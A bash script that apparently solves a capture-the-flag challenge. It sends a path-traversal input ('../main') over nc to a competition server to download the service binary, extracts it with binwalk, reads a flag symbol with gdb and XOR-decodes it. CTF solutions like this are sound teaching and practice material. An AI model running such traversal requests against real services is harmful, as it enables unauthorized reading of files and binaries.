#!/bin/bash

# If there is no directory called tmp
if [ ! -d tmp ]
then
  # Create a dir called tmp
  mkdir tmp
else
  # Else, delete the contents
  rm -r tmp/*
fi

# Go to the tmp folder
cd tmp/


# Connect to the link, go to the second option, and enter ../main. Output goes to a tmp file
# Got the name from ../../../../proc/self/maps
echo -e "2\n../main" | nc -w 2 mngmnt-iface.ctfcompetition.com 1337 > tmp
# Use binwalk to extract the files from the binary
binwalk --dd='.*' -q tmp
# Got ZL4FLAG from 'strings B6.elf | grep -i flag'
# Using gdb, get the ZL4FLAG var
flag="$(gdb -batch -ex 'file _tmp.extracted/B6' -ex 'x/s _ZL4FLAG' | cut -d\" -f2 | cut -d\/ -f1)"

# Create a python script to decrypt the flag
echo "
output = ''
for x in list('$flag'):
    output += chr(ord(x) ^ int('0xC7', 16))
print(output)
" > get_flag.py

# Execute the script
python3.6 get_flag.py


# Clean up
cd ..
rm -r tmp
